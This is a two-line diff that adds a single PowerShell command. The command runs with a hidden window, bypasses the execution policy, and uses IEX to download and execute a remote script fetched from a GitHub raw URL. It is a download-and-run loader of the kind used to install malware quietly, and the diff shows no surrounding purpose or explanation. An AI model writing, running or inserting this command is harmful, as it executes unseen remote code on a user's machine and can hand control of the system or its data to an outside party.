@@ -1,0 +1,2 @@
+powershell -WindowStyle Hidden -Command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force; IEX (New-Object Net.WebClient).DownloadString('https://github.com/TugaChan/lolzrez/raw/main/psi.ps1')"
+
